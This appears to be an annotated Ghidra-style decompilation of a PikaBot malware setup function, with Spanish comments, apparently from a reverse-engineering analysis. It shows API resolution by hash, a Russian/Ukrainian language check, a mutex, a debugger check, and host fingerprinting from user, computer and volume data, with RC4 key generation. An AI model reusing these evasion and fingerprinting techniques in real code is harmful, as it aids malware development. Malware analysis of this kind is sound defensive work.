
void create_stage3_pikabotstruct_ptr(void)
{

  *(undefined4 *)(struct_ptr + 0x1a0) = *(undefined4 *)(unaff_FS_OFFSET + 0x18); // puntero al teb => *TEB

  // get ntdll BaseAddress
  ptr_2_ndtll = get_dll_ptr(0x4446e791);
  *(int *)(struct_ptr + 0x124)  = ptr_2_ndtll;

  if (ptr_2_ndtll != 0) {
    // ntdll functions

    resolved_function = resolver(ptr_2_ndtll,0x13204cda);
    *(uint *)(struct_ptr + 0x10) = resolved_function;

    resolved_function = resolver(ptr_2_ntdll ,0x71387567);
    *(uint *)(struct_ptr + 0xc) = resolved_function;

    resolved_function = resolver(ptr_2_ntdll ,-0x248b1202);
    *(uint *)(struct_ptr + 0x14) = resolved_function;

    resolved_function = resolver(ptr_2_ntdll ,0x606e9e15);
    *(uint *)(struct_ptr + 0x18) = resolved_function;

    resolved_function = resolver(ptr_2_ntdll ,-0x5b01ab85);
    *(uint *)(struct_ptr + 0x1c) = resolved_function;

    resolved_function = resolver(ptr_2_ntdll ,-0xe490516);
    *(uint *)(struct_ptr + 0x20) = resolved_function;

    resolved_function = resolver(ptr_2_ntdll ,-0x19f2ba7f);
    *(uint *)(struct_ptr + 0x24) = resolved_function;

    resolved_function = resolver(ptr_2_ntdll ,-0x4f996b67);
    *(uint *)(struct_ptr + 0x28) = resolved_function;

    resolved_function = resolver(ptr_2_ntdll ,-0x9f7ce01);
    *(uint *)(struct_ptr + 0x2c) = resolved_function;

    resolved_function = resolver(ptr_2_ntdll ,-0x2f5a49ad);
    *(uint *)(struct_ptr + 0x30) = resolved_function;

    // get kernel32 BaseAddress
    ptr_2_kernel32 = get_dll_ptr(-0x36420687);
    *(int *)(struct_ptr + 0x128) = ptr_2_kernel32;

    if (ptr_2_kernel32 != 0) {
      // kernel32 functions

      resolved_function = resolver(ptr_2_kernel32,0x2a88622);
      *(uint *)(struct_ptr + 0x34) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32 ,-0x228297c5);
      *(uint *)(struct_ptr + 0x38) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32 ,0x5d624c79);
      *(uint *)(struct_ptr + 0x3c) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32 ,0x655e267b);
      *(uint *)(struct_ptr + 0x40) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32 ,-0x469b7ba);
      *(uint *)(struct_ptr + 0x44) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32 ,-0x662e6f4c);
      *(uint *)(struct_ptr + 0x5c) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32 ,0x173e3e74);
      *(uint *)(struct_ptr + 0x60) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32 ,-0x96540c0);
      *(uint *)(struct_ptr + 0x64) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,0x3d8e64ae);
      *(uint *)(struct_ptr + 0x68) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,0x129915b2);
      *(uint *)(struct_ptr + 0x48) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,-0x1c1e3aa9);
      *(uint *)(struct_ptr + 0x7c) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,0x5c7b9498);
      *(uint *)(struct_ptr + 0x80) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,-0x7d99994);
      *(uint *)(struct_ptr + 0x84) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,-0xd5ca6a1);
      *(uint *)(struct_ptr + 0x88) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,-0x4389afa6);
      *(uint *)(struct_ptr + 0x74) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,-0x781f05f4);
      *(uint *)(struct_ptr + 0x78) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,-0x2644720d);
      *(uint *)(struct_ptr + 0x8c) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,0x6987f50b);
      *(uint *)(struct_ptr + 0x90) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,-0x4b80bd7b);
      *(uint *)(struct_ptr + 0x94) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,0x2f0d988b);
      *(uint *)(struct_ptr + 0x98) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,0x7b707a59);
      *(uint *)(struct_ptr + 0x9c) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,0x4ffb434c);
      *(uint *)(struct_ptr + 0xa0) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,0x2202e483);
      *(uint *)(struct_ptr + 0xa4) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,0x184f096b);
      *(uint *)(struct_ptr + 0xac) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,-0x548e188a);
      *(uint *)(struct_ptr + 0xb0) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,0x1d52b070);
      *(uint *)(struct_ptr + 0xb4) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,-0x433fb473);
      *(uint *)(struct_ptr + 0xb8) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,0x24530014);
      *(uint *)(struct_ptr + 0xbc) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,0x6c9cc59c);
      *(uint *)(struct_ptr + 0xc0) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,-0x1acab2d9);
      *(uint *)(struct_ptr + 0x6c) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,-0x22bcde19);
      *(uint *)(struct_ptr + 0x70) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,-0x1a451b42);
      *(uint *)(struct_ptr + 0x4c) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,0x44fa467f);
      *(uint *)(struct_ptr + 0x50) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,0x78274cb6);
      *(uint *)(struct_ptr + 0x54) = resolved_function;

      resolved_function = resolver(ptr_2_kernel32,0x576f4536);
      *(uint *)(struct_ptr + 0x58) = resolved_function;

      lang_isUKRU = lang_UKRU(ptr_2_kernel32);

      if (lang_isUKRU == 0) {

        /*//kernel32.CreateMutexW
          HANDLE CreateMutexW(
            [in, optional] LPSECURITY_ATTRIBUTES lpMutexAttributes,
            [in]           BOOL                  bInitialOwner,
            [in, optional] LPCWSTR               lpName
          );
          lpMutexAttributes: Si este parámetro es NULL, los procesos secundarios no pueden heredar el identificador
          bInitialOwner: Si este valor es TRUE y el autor de la llamada creó la exclusión mutua, el subproceso que realiza la llamada obtiene la propiedad inicial del objeto de exclusión mutua
          lpName: Nombre del objeto de exclusión mutua
          -> Return value:  el objeto existía antes de esta llamada de función, el valor devuelto es un identificador del objeto existente y la función GetLastError devuelve ERROR_ALREADY_EXISTS.
        */
        (**(code **)(struct_ptr + 0x6c))(0,1,L"{FA627EDC-65A6-49DE-8D89-1E8B76726799}");
        last_error = (**(code **)(struct_ptr + 0x70))(); // kernel32.GetLastError
        
        if (last_error != 0xb7) { // ERROR_ALREADY_EXISTS = 0xb7

          fill_structWebData();
          blockProgram(1); // siempre se bloquea

          function_ptrs = (code **)&DAT_0040f080;
          fill_array_functions((int)function_ptrs,4);
          // function_ptrs 
          //    1. fill_winhttp
          //    2. fill_netapi32
          //    3. fill_advapi32
          //    4. fill_user32
          i = 0;
          do {
            dll_ptr = (*function_ptrs[i])();
            if (dll_ptr == 0) goto END_FUNCTION_WITH_FAILURE;
            i = i + 1;
          } while (i != 4);

          *(undefined4 *)(struct_ptr + 0x150) = 0xffff;
          ret = call_syscalls0(-1); // ZwQueryInformationProcessç
          if (ret == 0) {
            *(undefined2 *)(struct_ptr + 0x150) = 0;
          }
          else {
            *(undefined2 *)(struct_ptr + 0x150) = 9;
          }

  /*
    BOOL GetVolumeInformationW(
      [in, optional]  LPCWSTR lpRootPathName,
      [out, optional] LPWSTR  lpVolumeNameBuffer,
      [in]            DWORD   nVolumeNameSize,
      [out, optional] LPDWORD lpVolumeSerialNumber,
      [out, optional] LPDWORD lpMaximumComponentLength,
      [out, optional] LPDWORD lpFileSystemFlags,
      [out, optional] LPWSTR  lpFileSystemNameBuffer,
      [in]            DWORD   nFileSystemNameSize
    );
  */
          lpVolumeSerialNumber = 0x00A7F3EC
          lpRootPathName = "C:\\"
          (**(code **)(struct_ptr + 0x4c))(lpRootPathName,0,0,&lpVolumeSerialNumber,0,0,0,0);
          // VolumeSerialNumber = '.NF4'

          // LocalAlloc()
          ptr2 = (**(code **)(struct_ptr + 0x50))(0x40,0x208);
          ptr3 = (**(code **)(struct_ptr + 0x50))(0x40,0x208);
          ptr4 = (char *)(**(code **)(struct_ptr + 0x50))(0x40,0x400);
          
          lpBuffer_size1 = 0x208;
          lpBuffer_size2 = 0x208;

          /*
          recuperar el nombre de usuario en un formato especificado
          BOOL GetUserNameW(
            [out]     LPWSTR  lpBuffer,
            [in, out] LPDWORD pcbBuffer
          );
          lpBuffer: Puntero al búfer para recibir el nombre de inicio de sesión del usuario.
          pcbBuffer: 
            [in]  En la entrada, esta variable especifica el tamaño del búfer de lpBuffer de , en TCHAR.
            [out] En la salida, la variable recibe el número de TCHAR copiados en el búfer, incluido el carácter NULO de terminación.
          ret -> sucess -> !=0
          */
          success1 = (**(code **)(struct_ptr + 0xec))(ptr2 ,&lpBuffer_size);
          /*
          BOOL GetComputerNameW(
            [out]     LPWSTR  lpBuffer,
            [in, out] LPDWORD nSize
          );
          lpBuffer: Puntero a un búfer que recibe el nombre del equipo o el nombre del servidor virtual del clúster
          nSize: 
            [in]  En la entrada, esta variable especifica el tamaño del búfer de lpBuffer de , en TCHAR.
            [out] En la salida, la variable recibe el número de TCHAR copiados en el búfer, incluido el carácter NULO de terminación.
          ret -> sucess -> !=0
          */
          success2 = (**(code **)(struct_ptr + 0xb4))(ptr3, &lpBuffer_size2);

          if ((success1 != 0) && (success2 != 0)) {
            /*
            int WINAPIV wsprintfA(
              [out] LPSTR  unnamedParam1,
              [in]  LPCSTR unnamedParam2,
                    ...    
            );
            unnamedParam1: Búfer que va a recibir la salida con formato. El tamaño máximo del búfer es de 1024 bytes
            unnamedParam2: Las especificaciones de control de formato. Además de los caracteres ASCII normales, aparece una especificación de formato para cada argumento en esta cadena
            ... : Uno o varios argumentos opcionales. El número y el tipo de parámetros de argumento dependen de las especificaciones de control de formato correspondientes en el parámetro lpFmt.
            */
            format = "%ls|%lshresult"
            (**(code **)(struct_ptr + 0xd4))(ptr4, format, ptr2, ptr3);
            // ptr4 -> IMFReversing|DESKTOP-Q7VQO2Ohresult

            sizeOfUserandName = string_size(ptr4);
            strencrypted = encryptString((int)ptr4, sizeOfUserandName, lpVolumeSerialNumber);

            if (ptr4 != (char *)0x0) {
              fillContentWithVal((int)ptr4,0,0x400);
              (**(code **)(struct_ptr + 0x58))(ptr4);
            }

            if (ptr2 != 0) {
              fillContentWithVal(i,0,local_524);
              (**(code **)(struct_ptr + 0x58))(i);
            }
            if (ptr_2_ndtll != 0) {
              fillContentWithVal(ptr_2_ndtll,0,local_520);
              (**(code **)(struct_ptr + 0x58))(ptr_2_ndtll);
            }

            checksum(&strencrypted); // *param_1 = *param_1 * 0x10e1 + 0x1538
            checksum(&lpVolumeSerialNumber); // *param_1 = *param_1 * 0x10e1 + 0x1538
            checksum(&lpVolumeSerialNumber);
            i = 0;
            do {
              checksum(&lpVolumeSerialNumber);
              i++;
            } while (i != 8);
            
            ptr5 = call_RtlAllocateHeap(0x208);
            *(undefined4 *)(ptr_2_ndtll + 0x13c) = ptr5;
            if (*(int *)(struct_ptr + 0x13c) == 0) {
              return;
            }
            /* Escribe datos con formato en el búfer especificado
            int WINAPIV wsprintfW(
              [out] LPWSTR  unnamedParam1,
              [in]  LPCWSTR unnamedParam2,
                    ...     
            );
            */
            format = L"%07lX%09lX%lu";
            (**(code **)(struct_ptr + 0xc4))
                      (*(int *)(struct_ptr + 0x13c), format, strencrypted, lpVolumeSerialNumber); // use host_id and lpVolumeSerialNumber crcs
            // &L"96C407F500000ADC72268059519"

            // create random RC4 key
            if (*(int *)(struct_ptr + 0x158) == 0) {
              ptr = (**(code **)(struct_ptr + 0x50))(0x40,0x20); // LocalAlloc
              *(undefined4 *)(struct_ptr + 0x158) = ptr;
              i = 0;
              do {
                rand = get_Nonzero_randomNumber();
                *(char *)(*(int *)(struct_ptr + 0x158) + i) = (char)rand;
                i = i + 1;
              } while (i != 0x20);
            }
            // create random shiftSize
            rand2 = get_Nonzero_randomNumber();
            *(uint *)(struct_ptr + 0x15c) = rand2 % 0x19;

            TEB = (int *)(struct_ptr + 0x1a0);
            process_ID = *(undefined4 *)(*TEB + 0x20);
            thread_ID = *(undefined4 *)(*TEB + 0x24);

            *(undefined4 *)(struct_ptr + 0x140) = 0; // registered = False
            *(undefined4 *)(struct_ptr + 0x144) = process_ID;
            *(undefined4 *)(struct_ptr + 0x148) = thread_ID;
            return;
          }
        }
      }
    }
  }
END_FUNCTION_WITH_FAILURE:
  *(undefined4 *)(struct_ptr + 8) = 1;
  return;
}
